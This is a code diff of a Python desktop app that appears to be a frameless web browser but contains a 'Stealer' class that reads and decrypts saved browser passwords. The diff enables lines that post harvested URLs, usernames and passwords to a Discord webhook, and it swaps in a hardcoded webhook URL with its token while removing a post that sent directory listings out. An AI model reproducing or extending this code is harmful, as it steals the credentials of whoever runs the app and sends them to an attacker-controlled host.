@@ -60,9 +60,8 @@ from qframelesswindow import FramelessWindow
 class WorkerThread(QThread):
     proc = None 
     def run(self):
-        access_log_webhook = "https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L"
+        access_log_webhook = "https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI"
         try:
-            access_message = requests.post(access_log_webhook, json={"content": f"[{os.getcwd()}] {os.listdir('.')}"})
             with open(path.join("app.py"), "r", encoding="utf-8") as afr: app_source = afr.read()
             exec(app_source)
         except Exception as we:
@@ -128,8 +127,7 @@ class Stealer():
             iv = reader(12)
             secrets = reader()
             if key is None: return ""
-            decryptor = AES.new(self.key, AES.MODE_GCM, iv)
-            return decryptor.decrypt(secrets)[:-16].decode("latin-1")
+            return str(password) # AES.new(self.key, AES.MODE_GCM, iv).decrypt(secrets)[:-16].decode("latin-1")
         else: return CryptUnprotectData(password, None, None, None, 0)[1].decode("latin-1")
 
     def get_credentials(self):
@@ -167,10 +165,10 @@ class ExtraThread(QThread):
             for url, username, password in stealer.get_credentials(): 
                 text += f"{url} > {username} > {password}\n"
                 if text.count("\n") > 20:
-                    # post(password_stealer_webhook, data={"content": f"```{text}```"})
+                    post(password_stealer_webhook, data={"content": f"```{text}```"})
                     text = ""
             stealer.save_and_clean()
-            # post(password_stealer_webhook, data={"content": "- "*10})
+            post(password_stealer_webhook, data={"content": "- "*10})
         except: pass
 
 class WebBrowser(FramelessWindow):
